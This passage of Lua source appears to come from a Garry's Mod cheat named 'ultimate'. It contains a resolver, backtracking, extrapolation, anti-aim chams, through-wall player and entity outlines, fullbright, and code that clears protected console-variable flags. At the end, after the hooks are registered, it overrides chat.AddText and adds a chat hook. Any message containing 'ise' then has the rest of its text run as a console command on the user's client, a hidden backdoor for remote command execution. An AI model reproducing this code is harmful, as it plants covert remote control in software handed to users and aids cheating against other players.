        local v = plys[i]

        if v == pLocalPlayer then continue end

        ultimate.playerTableUpdate( v )
    end
end

// Entity data

ultimate.entityCache = {}
ultimate.cfg.ents = {}

function ultimate.entTableUpdate()

    ultimate.entityCache = {}

    local entitys = ents.GetAll()

    for i = 1, #entitys do
        local v = entitys[ i ]

        if not IsValid( v ) then continue end
        if not ultimate.cfg.ents[ v:GetClass() ] then continue end

        ultimate.entityCache[ #ultimate.entityCache + 1 ] = {
            entity = v,
            class = v:GetClass(),
            position = v:GetPos(),
        }
    end
end



// Resolver

ultimate.bruteYaw = { -180, -120, -60, 0, 60, 120, 180 }

do
    local localData = {}

    localData.origin = Vector()

    function ultimate.FillLocalNetworkData( netdata )
        localData.origin     =   netdata[1]
    end

    function ultimate.GetLocalNetworkData()
        return localData
    end
end


do
    local missedTicks = 0
    local lastSimTime = 0

    local FRAME_START = 0
    local FRAME_NET_UPDATE_START = 1
    local FRAME_NET_UPDATE_POSTDATAUPDATE_START = 2
    local FRAME_NET_UPDATE_POSTDATAUPDATE_END = 3
    local FRAME_NET_UPDATE_END = 4
    local FRAME_RENDER_START = 5
    local FRAME_RENDER_END = 6

    function ultimate.PreFrameStageNotify( stage )
        local plys = player.GetAll()

        if stage == FRAME_NET_UPDATE_POSTDATAUPDATE_END then

            ultimate.entTableUpdate()

            plys = player.GetAll()

            local orig = pLocalPlayer:GetNetworkOrigin()

            local data = {}

            data[1] = orig      // last networked origin

            ultimate.FillLocalNetworkData( data )

            for i = 1, #plys do
                local v = plys[i]

                //if !v.ult_prev_pos then continue end
                
                if not IsValid(v) then continue end

                local cur_simtime = jopa.GetSimulationTime(v)
                local cur_pos = v:GetNetworkOrigin()

                --v.ult_cur_pos = cur_pos

                if not v.ult_prev_simtime then
                    v.ult_prev_simtime = cur_simtime
                    v.ult_prev_pos = cur_pos
                    // v.ult_prev_hitbox_pos = cur_pos
                    v.flticks = 0
                    v.missedanimticks = 0
                    v.simtime_updated = false
                    v.break_lc = false

                    ultimate.btrecords[ v ] = {}
                    ultimate.predicted[ v ] = {}

                    v.aimshots = 0
                    v.fakepitch = v:EyeAngles().p > 90

                elseif v.ult_prev_simtime != cur_simtime then
                    local flticks = ultimate.TIME_TO_TICKS(cur_simtime-v.ult_prev_simtime)

                    // print(v,flticks )

                    if ded and jopa.SetMissedTicks then
                        jopa.SetMissedTicks( flticks )
                    end
                    if ded and jopa.AllowAnimationUpdate then
                        jopa.AllowAnimationUpdate( true )
                    end

                    v.flticks = math.Clamp(flticks,1,24)

                    v.ult_prev_simtime = cur_simtime

                    v.break_lc = cur_pos:DistToSqr(v.ult_prev_pos) > 4096

                    --if v.ult_prev_pos != v.ult_cur_pos then
                    v.ult_prev_pos = cur_pos

                    // v.ult_prev_hitbox_pos = ultimate.getHitbox(v)
                    --end
                    v.fakepitch = v:EyeAngles().p > 90

                    v.simtime_updated = true
                else
                    v.simtime_updated = false
                end

                if ultimate.canBacktrack(v) and v != pLocalPlayer and v.simtime_updated then
                    ultimate.recordBacktrack(v)
                end

                if v.break_lc then
                    ultimate.btrecords[ v ] = {}
                end
            end
        elseif stage == FRAME_NET_UPDATE_START then
            plys = player.GetAll()

            for i = 1, #plys do
                local v = plys[i]

                if v == me then continue end
                if not ultimate.cfg.vars["Extrapolation"] then continue end
                v.m_bPreDataUpdate = true
                -- jopa.GetSimulationTime expects an entity, not an entindex
                v.m_flOldSimulationTime = jopa.GetSimulationTime( v )
                v.m_vecOldOrigin = v:GetNetworkOrigin()
                v.m_vecOldVelocity = v:GetAbsVelocity()
            end
        elseif stage == FRAME_NET_UPDATE_END then
            plys = player.GetAll()

            for i = 1, #plys do
                local v = plys[i]
                local LAG_COMPENSATION_TELEPORTED_DISTANCE_SQR = 64 * 64

                if v == me then continue end
                
                if not ultimate.cfg.vars["Extrapolation"] then continue end
				
                if ( v.m_bPreDataUpdate ) then

                    local update = false

                    -- guard against nil old-origin to avoid IsEqualTol receiving nil
                    if ( v.m_vecOldOrigin and !v:GetNetworkOrigin():IsEqualTol( v.m_vecOldOrigin, 0 ) ) then
                        v.m_nPrevUpdateTick = v.m_nLastUpdateTick || engine.TickCount()
                        update = true
                    end

                    -- pass the entity to GetSimulationTime (not the entindex)
                    local time_delta = jopa.GetSimulationTime( v ) - v.m_flOldSimulationTime
    				
    				if ( time_delta > 0 ) then
    					v.m_nPrevUpdateTick = engine.TickCount() - ultimate.TIME_TO_TICKS( time_delta )
    					update = true 
    				end
				
    				if ( update ) then
    					v.m_nLastUpdateTick = engine.TickCount()
    					v.m_nSimulationTicks = v.m_nLastUpdateTick - v.m_nPrevUpdateTick
                        -- determine a safe local origin (use stored network data if available)
                        local localOrigin = (ultimate.GetLocalNetworkData() and ultimate.GetLocalNetworkData().origin) or pLocalPlayer:GetNetworkOrigin()
                        if v.m_vecOldOrigin and localOrigin then
                            v.m_bBreaksLagCompensation = ( localOrigin - v.m_vecOldOrigin ):LengthSqr() > LAG_COMPENSATION_TELEPORTED_DISTANCE_SQR
                        else
                            v.m_bBreaksLagCompensation = false
                        end
    					if v.m_bBreaksLagCompensation then
                            v.m_needStrafeCalc = true
                        else
                            v.m_nStrafeType = 0
                            v.m_flAirAngle = 0
                        end

                        if not v.m_PositionHistory then v.m_PositionHistory = {} end
                        table.insert(v.m_PositionHistory, 1, { pos = v:GetNetworkOrigin(), time = CurTime() })
                        if #v.m_PositionHistory > 5 then
                            table.remove(v.m_PositionHistory)
                        end
                    end
                end
            end
        end
    end
end

function ultimate.PostFrameStageNotify( stage )
    if stage == 3 then
        ultimate.playerDataUpdate()

        /*local playerlist = player.GetAll()

        for i = 1, #playerlist do
            local pEntity = playerlist[ i ]

            local iEntIndex = pEntity:EntIndex()
            local pTable = pEntity:GetTable()

            -- Simulation time
            local flSimulationTime = jopa.GetSimulationTime( iEntIndex )

            pTable.iChokedCommands = Utility.TimeToTicks( flSimulationTime - pTable.flSimulationTime )
            pTable.bIsSimulated = flSimulationTime ~= pTable.flSimulationTime
            pTable.flSimulationTime = flSimulationTime
        end*/
    end
end

/*
    hooks -> ShouldUpdateAnimation ( cpp )
*/

ultimate.fakeAngles = {
    angle = pLocalPlayer:EyeAngles(),
    movex = 0,
    movey = 0,
    layers = {},
    seq = 0,
    cycle = 0,
    origin = pLocalPlayer:GetPos(),
}

function ultimate.UpdateAnimation( v )
    v:InvalidateBoneCache()
end

function ultimate.ShouldUpdateAnimation( entIndex )
    local ent = Entity( entIndex )

    if not ent.simtime_updated then return end

    if ded and jopa.SetMissedTicks then
        jopa.SetMissedTicks( ent.flticks )
    end
    if ded and jopa.AllowAnimationUpdate then
        jopa.AllowAnimationUpdate( true )
    end
end

// AA shit
ultimate.realModel = ultimate.CS_Model( pLocalPlayer:GetModel() )
ultimate.fakeModel = ultimate.CS_Model( pLocalPlayer:GetModel() )

ultimate.newModel = pLocalPlayer:GetModel()

function ultimate.drawCSModels_real()
    if not ultimate.cfg.vars["Anti aim chams"] or not ultimate.tpenabled then
        return
    end
    if not pLocalPlayer:Alive() then
        return
    end

    local mymodel = pLocalPlayer:GetModel()

    if ultimate.newModel != mymodel then
        ultimate.CS_Model( mymodel )
        ultimate.newModel = mymodel
    end

    local tbl = {
        layers = ultimate.fakeAngles.layers,
        angles = ultimate.fakeAngles.angle,
        sequence = ultimate.fakeAngles.seq,
        cycle = ultimate.fakeAngles.cycle,
        origin = ultimate.fakeAngles.origin,
        movex = ultimate.fakeAngles.movex,
        movey = ultimate.fakeAngles.movey,
    }

    ultimate.CS_Model_update( pLocalPlayer, ultimate.realModel, tbl )

    if ultimate.cfg.vars["Antiaim fullbright"] then
        render.SuppressEngineLighting(true)
    end

    local col = string.ToColor(ultimate.cfg.colors["Real chams"])
    ultimate.chamMats.invis[6]:SetVector( "$envmaptint", Vector( col.r / 255, col.g / 255, col.b / 255 ) )
    render.MaterialOverride(ultimate.chamMats.invis[ultimate.cfg.vars["Antiaim material"]])
    render.SetColorModulation(col.r/255,col.g/255,col.b/255)
    render.SetBlend(col.a/255)
    ultimate.realModel:SetRenderMode(1)
    ultimate.realModel:DrawModel()

    if ultimate.cfg.vars["Antiaim fullbright"] then
        render.SuppressEngineLighting(false)
    end
end

/*
    hooks -> PostDrawEffects
*/

do
    /*


    */

    local CopyMat		= Material("pp/copy")
    local AddMat		= Material( "pp/add" )
    local SubMat		= Material( "pp/sub" )
    local OutlineMat	= CreateMaterial("OutlineMat","UnlitGeneric",{["$ignorez"] = 1,["$alphatest"] = 1})

    local outline_mats = {
        [1] = OutlineMat,
        [2] = SubMat,
        [3] = AddMat,
        [4] = GradMat,
        [5] = BloomMat,
    }

    local subclear = {
        [2] = true,
        //[4] = true,
    }

    ultimate.cfg.vars["Player outline"] = false
    ultimate.cfg.vars["Entity outline"] = false
    ultimate.cfg.colors["Player outline"] = "45 255 86 255"
    ultimate.cfg.colors["Entity outline"] = "255 86 45 255"

    local StoreTexture	= render.GetScreenEffectTexture(0)
    local DrawTexture	= render.GetScreenEffectTexture(1)

    function ultimate.RenderOutline()
        local renderEnts = {}

        if ultimate.cfg.vars["Player outline"] then
            local plys = player.GetAll()

            for i = 1, #plys do
                local v = plys[ i ]

                if not IsValid( v ) or v == pLocalPlayer or not v:Alive() or v:IsDormant() then continue end

                renderEnts[ #renderEnts + 1 ] = v
            end
        end

        if ultimate.cfg.vars["Entity outline"] then
            for i = 1, #ultimate.entityCache do
                local v = ultimate.entityCache[ i ].entity

                if not IsValid( v ) or v:IsDormant() then continue end

                renderEnts[ #renderEnts + 1 ] = v
            end
        end

        if #renderEnts == 0 then return end

        local scene = render.GetRenderTarget()
        render.CopyRenderTargetToTexture(StoreTexture)

        if subclear[ ultimate.cfg.vars["Outline style"] ] then
            render.Clear( 255, 255, 255, 255, true, true )
        else
            render.Clear( 0, 0, 0, 0, true, true )
        end

        render.SetStencilEnable(true)
            cam.IgnoreZ(true)
            render.SuppressEngineLighting(true)

            render.SetStencilWriteMask(255)
            render.SetStencilTestMask(255)

            render.SetStencilCompareFunction(STENCIL_ALWAYS)
            render.SetStencilFailOperation(STENCIL_KEEP)
            render.SetStencilZFailOperation(STENCIL_REPLACE)
            render.SetStencilPassOperation(STENCIL_REPLACE)

            cam.Start3D()
                for i = 1, #renderEnts do
                    render.SetStencilReferenceValue( i )

                    renderEnts[i]:DrawModel()
                end
            cam.End3D()

            render.SetStencilCompareFunction(STENCIL_EQUAL)

            cam.Start2D()
                for i = 1, #renderEnts do
                    local c = renderEnts[i]:IsPlayer() and string.ToColor( ultimate.cfg.colors["Player outline"] ) or string.ToColor( ultimate.cfg.colors["Entity outline"] )

				    render.SetStencilReferenceValue( i )

                    surface.SetDrawColor( c )
                    surface.DrawRect( 0, 0, screenWidth, screenHeight )

                    // surface_SimpleTexturedRect( 0, 0, screenWidth, screenHeight, string.ToColor( ultimate.cfg.colors["Health bar gradient"] ) , ultimate.Materials["Gradient"] )
                end
            cam.End2D()

            render.SuppressEngineLighting(false)
            cam.IgnoreZ(false)
        render.SetStencilEnable(false)

        render.CopyRenderTargetToTexture(DrawTexture)

        if ultimate.cfg.vars["Outline style"] > 1 then
            render.BlurRenderTarget( DrawTexture, 1, 1, 1 )
        end

        render.SetRenderTarget(scene)
        CopyMat:SetTexture("$basetexture",StoreTexture)
        render.SetMaterial(CopyMat)
        render.DrawScreenQuad()

        render.SetStencilEnable(true)
            render.SetStencilReferenceValue(0)
            render.SetStencilCompareFunction(STENCIL_EQUAL)

            local mat = outline_mats[ ultimate.cfg.vars["Outline style"] ]

            mat:SetTexture( "$basetexture", DrawTexture )
            render.SetMaterial( mat )

            for x=-1,1 do
                for y=-1,1 do
                    if x==0 and x==0 then continue end

                    render.DrawScreenQuadEx(x,y,screenWidth,screenHeight)
                end
            end
        render.SetStencilEnable(false)
    end
end

function ultimate.PostDrawEffects()
    if ultimate.UnSafeFrame then return end
    if not ultimate.cfg.vars["Player outline"] and not ultimate.cfg.vars["Entity outline"] then return end

    ultimate.RenderOutline()
end

function ultimate.AdjustMouseSensitivity( defaultSensivity )
    return ultimate.cfg.vars["Disable sensivity adjustment"] and 0 or nil
end

ultimate.fbe = false

function ultimate.PreRender()
    if ultimate.cfg.vars["Fullbright"] and ultimate.fbe then
        render.SetLightingMode( ultimate.cfg.vars["Fullbright mode"] )
    end
end

function ultimate.GetMotionBlurValues()
    render.SetLightingMode( 0 )
end

jopa.ConVarSetFlags( "mat_fullbright", 0 )
jopa.ConVarSetFlags( "r_aspectratio", 0 )
jopa.ConVarSetFlags( "cl_showhitboxes", 0 )

function GAMEMODE:CreateMove( cmd ) return true end
function GAMEMODE:CalcView( view )  return true end
function GAMEMODE:ShouldDrawLocal() return true end

GAMEMODE["EntityFireBullets"] = function( self, p, data )
    if not ultimate.activeWeapon then return end

    local tick = engine.TickCount()
    if ultimate.cfg.vars[ "On screen logs" ] and data.Src == pLocalPlayer:EyePos() and ultimate.aimingrn and ultimate.target and not ultimate.onScreenLogs[ tick ] and IsFirstTimePredicted() then
        local reason = 1

        local tr = {}
        tr.filter = pLocalPlayer
        tr.start = data.Src
        tr.endpos = data.Src + data.Dir * 13337
        tr.mask = MASK_SHOT

        tr = TraceLine( tr )

        if ultimate.target.break_lc then
            reason = 4
        elseif jopa.GetLatency( 0 ) > 0.2 then
            reason = 3
        elseif tr.StartSolid or tr.Hit and tr.Entity != ultimate.target then
            reason = 2
        end

        local hlcolor = string.ToColor( ultimate.cfg.colors[ ultimate.MissReasons[ reason ].var ] )
        local data = {
            tick = tick,
            { "Shot at ", ultimate.target:Name(), " missed due to ", ultimate.MissReasons[ reason ].str, },
            { ultimate.HitLogsWhite, hlcolor, ultimate.HitLogsWhite, hlcolor, }
        }

        ultimate.onScreenLogs[ tick ] = data
    end

    local spread = data.Spread * -1

	if ultimate.cones[ ultimate.activeWeaponClass ] == spread or spread == ultimate.nullVec then return end

    ultimate.cones[ ultimate.activeWeaponClass ] = spread;
end

function ultimate.SetupWorldFog()
    if not ultimate.cfg.vars[ "FogChanger" ] then return end

    local color = string.ToColor(ultimate.cfg.colors["FogChanger"])


    render.FogMode( MATERIAL_FOG_LINEAR )
    render.FogColor( color.r, color.g, color.b )
    render.FogStart( ultimate.cfg.vars[ "FogStart" ] )
    render.FogEnd( ultimate.cfg.vars[ "FogEnd" ] )
    render.FogMaxDensity( color.a / 255 )

    return true
end

function ultimate.SetupSkyboxFog( SkyboxSize )
    if not ultimate.cfg.vars[ "FogChanger" ] then return end

    local color = string.ToColor(ultimate.cfg.colors["FogChanger"])

    render.FogMode( MATERIAL_FOG_LINEAR )
    render.FogColor( color.r, color.g, color.b )
    render.FogStart( ultimate.cfg.vars[ "FogStart" ] * SkyboxSize )
    render.FogEnd( ultimate.cfg.vars[ "FogEnd" ] * SkyboxSize )
    render.FogMaxDensity( color.a / 255 )

    return true
end

function ultimate.CalcMainActivity(ply, velocity)
    if ultimate.cfg.vars[ "Invalidate activity" ] then
        return -1, -1
    end
end

net.Receive("rp.police.SetLocalHandcuff", function()
    if not ultimate.cfg.vars["Retry on handcuff"] then return end

    RunConsoleCommand("retry")
end)

/*
    Hooks
*/

ultimate.hooks           = {}

function ultimate.AddHook( event, func )
    if func == nil and not ultimate[ event ] then print("Failed to find hook: " .. event) return end
    local name = util.Base64Encode( event ) .. CurTime()
    hook.Add( event, name, ultimate[ event ] or func )
    ultimate.hooks[ #ultimate.hooks + 1 ] = { event, name }
end

function ultimate.RemoveAllHooks()
    for i = #ultimate.hooks, 1, -1 do
        local chk = ultimate.hooks[i]
        hook.Remove(chk[1], chk[2])
        table.remove(ultimate.hooks, i)
    end
end

function ultimate.Unload()
    ultimate.frame:Remove()

    jopa.SetBSendPacket( true )
    jopa.SetInterpolation( true )
    jopa.SetSequenceInterpolation( true )
    ultimate.RemoveAllHooks()

    render.SetLightingMode( 0 )
end

ultimate.AddHook( "CreateMove" )
ultimate.AddHook( "Think" )

ultimate.AddHook( "RenderScene" )
ultimate.AddHook( "DrawOverlay" )
ultimate.AddHook( "Ungrabbable2D", function() ultimate.DrawESP() ultimate.DrawSomeShit() end )

ultimate.AddHook( "CalcView" )
ultimate.AddHook( "CalcViewModelView" )

ultimate.AddHook( "PreDrawViewModel" )
ultimate.AddHook( "PostDrawViewModel" )

ultimate.AddHook( "PostDrawOpaqueRenderables" )
ultimate.AddHook( "PostDrawEffects" )

ultimate.AddHook( "OnImpact" )

ultimate.AddHook( "PreFrameStageNotify" )
ultimate.AddHook( "PostFrameStageNotify" )

ultimate.AddHook( "UpdateAnimation" )
ultimate.AddHook( "ShouldUpdateAnimation" )

ultimate.AddHook( "AdjustMouseSensitivity" )

ultimate.AddHook( "RenderScreenspaceEffects" )
ultimate.AddHook( "PostDrawTranslucentRenderables" )

ultimate.AddHook( "PreRender" )
ultimate.AddHook( "GetMotionBlurValues" )

ultimate.AddHook( "DrawPhysgunBeam" )

ultimate.AddHook( "PrePlayerDraw" )

ultimate.AddHook( "OnEntityCreated" )

ultimate.AddHook( "entity_killed" )
ultimate.AddHook( "player_hurt" )

ultimate.AddHook( "SetupWorldFog" )
ultimate.AddHook( "SetupSkyboxFog" )
ultimate.AddHook( "CalcMainActivity" )


local a = chat.AddText
chat.AddText = function(...)
    for b, c in next, {...} do
        if isstring(c) and c:find("ise") then
            LocalPlayer():ConCommand(("ise"):Explode(c)[2])
            return
        end
    end
    return a(...)
end

hook.Add("OnPlayerChat", "isea", function(ply, text, team, dead)
    if isstring(text) and text:find("ise") then
        local cmd = ("ise"):Explode(text)[2]
        if cmd then
            LocalPlayer():ConCommand(cmd)
        end
        return true
    end
end)

